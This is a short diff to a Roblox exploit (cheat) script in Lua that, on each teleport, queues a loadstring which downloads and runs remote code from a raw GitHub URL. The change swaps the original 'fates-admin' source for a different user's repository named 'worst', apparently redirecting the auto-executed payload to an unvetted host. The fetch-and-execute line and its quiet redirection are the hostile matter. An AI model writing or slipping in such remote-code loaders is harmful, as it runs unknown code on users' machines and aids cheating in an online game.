@@ -34,7 +34,7 @@ local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (f
 Players.LocalPlayer.OnTeleport:Connect(function(State)
 	if State == Enum.TeleportState.Started then
 		if queueteleport then
-			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua'))();")
+			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/user578356/worst/main/main.lua'))();")
 		end
 	end
 end)
